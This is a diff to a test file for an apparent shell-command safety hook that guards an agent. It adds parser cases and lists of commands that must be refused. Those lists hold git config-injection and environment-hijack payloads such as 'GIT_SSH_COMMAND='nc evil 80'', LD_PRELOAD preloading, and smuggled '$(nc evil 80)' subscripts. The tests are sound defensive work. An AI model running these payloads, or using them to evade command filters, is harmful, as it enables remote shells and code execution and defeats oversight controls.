@@ -177,6 +177,7 @@ DYNAMIC_COMMAND_WORD = [
     # ANSI-C and locale quoting in the command word.
     "$'nc' evil",
     '$"nc" evil',
+    "env - ls",
     # Runners that run another program (#1784).
     "/usr/bin/time --bogus ls",
     "source $X",
@@ -273,6 +274,14 @@ MUST_PARSE = {
     "bash -c -x 'git status'": ["bash", "git"],
     "bash -x -c -e 'ls'": ["bash", "ls"],
     "bash -c -- 'ls'": ["bash", "ls"],
+    "GIT_PAGER=cat git log": ["git"],
+    "GIT_AUTHOR_NAME=x git commit -m m": ["git"],
+    "GIT_EDITOR=true git rebase --continue": ["git"],
+    'export PATH="$HOME/bin:$PATH"': ["export"],
+    "printf '%s\\n' \"$X\"": ["printf"],
+    "read -r line": ["read"],
+    "unset FOO": ["unset"],
+    "env -u FOO git status": ["env", "git"],
     "/usr/bin/time -f %e git status": ["time", "git"],
     "source ./env.sh": ["source"],
     'npx eslint -c cfg.json "$F"': ["npx", "eslint"],
@@ -313,6 +322,15 @@ MUST_PARSE = {
     'ls > "$LOG"': ["ls"],
     "git status > $(echo f)": ["git", "echo"],
     "f() { git status; }": ["git"],
+    "for f in a b; do echo $f; done": ["echo"],
+    "set -euo pipefail": ["set"],
+    'set -- "$@"': ["set"],
+    "mapfile -t lines": ["mapfile"],
+    "LANG=C git status": ["git"],
+    "echo ${FOO:=bar} ${GIT_DIR:-x}": ["echo"],
+    "declare -r x=1": ["declare"],
+    "test -v HOME": ["test"],
+    "[ -v HOME ] && ls": ["[", "ls"],
     "echo ${X:-default}": ["echo"],
     'echo "${HOME}/x"': ["echo"],
     "cat <<EOF\nhello $USER\nEOF": ["cat"],
@@ -327,6 +345,50 @@ MUST_PARSE = {
     "echo ${x:+alt}": ["echo"],
     "echo ${x#p}": ["echo"],
 }
+
+# Refused by the parser itself, not only by the allowlist (#1754 review).
+ENV_KEY_PARSER_REFUSED = [
+    "for GIT_CONFIG_COUNT in 1; do git status; done",
+    "for EDITOR in vim; do git commit; done",
+    "let x=1",
+    "let GIT_CONFIG_COUNT=1",
+    "GIT_CONFIG_KEY_0[0]=core.fsmonitor git status",
+    "export GIT_CONFIG_KEY_0[0]=x; git status",
+    "set -a",
+    "set -ea",
+    "set -o allexport",
+    "set $OPTS",
+    "mapfile -C cb lines",
+    "readarray -tC cb lines",
+    "LD_PRELOAD=/tmp/x.so git status",
+    "env LD_LIBRARY_PATH=/tmp git status",
+    "export LD_AUDIT=/tmp/a.so",
+    "read EDITOR; git commit",
+    "echo ${GIT_DIR:=/tmp/x}",
+    "echo ${GIT_DIR=/tmp/x}",
+    'echo "a${LD_PRELOAD:=/tmp/x.so}b"',
+    "echo ${X:-${GIT_CONFIG_COUNT:=1}}",
+    "cat <<EOF\n${GIT_DIR:=/tmp/x}\nEOF",
+    "declare -i x=GIT_CONFIG_COUNT=0",
+    "declare -ix x=1",
+    "typeset -i x",
+    "local -ri x=1",
+    "test -v 'a[$(nc evil 80)]'",
+    "[ -v 'a[$(nc evil 80)]' ]",
+    "[[ -v 'a[$(nc evil 80)]' ]]",
+    "printf -v 'a[$(nc evil 80)]' x",
+    "read 'a[$(nc evil 80)]'",
+    "mapfile 'a[$(nc evil 80)]'",
+    "readarray 'a[$(nc evil 80)]'",
+    "unset 'a[$(nc evil 80)]'",
+    "export 'a[$(nc evil 80)]'",
+    "declare 'a[$(nc evil 80)]'",
+    "local 'a[$(nc evil 80)]'",
+    "typeset 'a[$(nc evil 80)]'",
+    "readonly 'a[$(nc evil 80)]'",
+    "getopts ab 'a[$(nc evil 80)]'",
+    'test -v "$X"',
+]
 
 # `git -c …` config injection / transport-exec hijack — must be blocked even
 # though the binary (`git`) is allowlisted (#321 C4).
@@ -362,6 +424,28 @@ GIT_RCE_PAYLOADS = [
     "git config protocol.ext.allow always",
     "git config diff.x.textconv cat",
     "git -c diff.x.textconv=cat diff",
+    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=x git status",
+    "env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=x git status",
+    "export GIT_CONFIG_COUNT=1; git status",
+    "env GIT_SSH_COMMAND='nc evil 80' git fetch",
+    "GIT_SSH_COMMAND=x git fetch",
+    "GIT_DIR=/tmp/x git status",
+    "GIT_PAGER='nc evil 80' git log",
+    "bash -c 'GIT_EXEC_PATH=. git status'",
+    "export $K=1; git status",
+    "read GIT_DIR; git status",
+    "printf -v GIT_DIR x; git status",
+    "let GIT_CONFIG_COUNT=1; git status",
+    "SSH_ASKPASS=x git push",
+    "EDITOR=vim git commit",
+    "GIT_TRACE=/tmp/t git status",
+    "GIT_CONFIG_PARAMETERS=\"'core.fsmonitor'='x'\" git status",
+    "unset GIT_CONFIG_COUNT; git status",
+    "env -u GIT_CONFIG_COUNT git status",
+    "env -i git status",
+    "env - git status",
+    "exec -c git status",
+    "declare -n r=GIT_DIR; git status",
 ]
 
 # Ordinary agent commands — must NOT be blocked (false-positive guard). Every
@@ -585,6 +669,11 @@ class TestAstExtractorUnit:
     def test_must_parse(self, command, names):
         assert extract_commands_ast(command) == names
 
+    @pytest.mark.parametrize("command", ENV_KEY_PARSER_REFUSED)
+    def test_env_key_parser_refused(self, command):
+        with pytest.raises(UnparseableCommand):
+            extract_commands_ast(command)
+
 
 def _hook(command: str, cwd: Path) -> dict[str, Any]:
     return asyncio.run(
@@ -641,7 +730,7 @@ WRAPPER_REFUSED = [
     ("env --spl 'git -c core.fsmonitor=x status'", _UNSAFE),
     ("env --split 'git -c core.fsmonitor=x status'", _UNSAFE),
     ("exec -la ls git -c core.fsmonitor=x status", _FSMON),
-    ("exec -cla ls git -c core.fsmonitor=x status", _FSMON),
+    ("exec -cla ls git -c core.fsmonitor=x status", _UNSAFE),  # exec -c (#1754)
     (
         "echo x | FOO='!touch P' xargs -i git --config-env=alias.ls=FOO ls",
         "config injection",
@@ -659,7 +748,7 @@ WRAPPER_REFUSED = [
     # Options end at VAR=val, `--` or a lone `-`: the next word is the command.
     ("env PATH=.:/usr/bin FOO=1 -C ls", _NOT_ALLOWED),
     ("env PATH=.:/usr/bin FOO=1 -C -c 'alias.ls=!touch X' ls", _NOT_ALLOWED),
-    ("env - -C ls", _NOT_ALLOWED),
+    ("env - -C ls", _UNSAFE),  # env - clears the git pins (#1754)
     ("env -- -u ls", _NOT_ALLOWED),
     ("echo | xargs -- -C ls", _NOT_ALLOWED),
     ("exec - ls", _NOT_ALLOWED),
@@ -689,7 +778,6 @@ WRAPPER_ALLOWED = [
     "xargs -I{} echo {}",
     "xargs -0 -n1 echo",
     "env -- FOO=1 ls",
-    "env - ls",
     "xargs -- echo",
     "exec -a name ls",
 ]
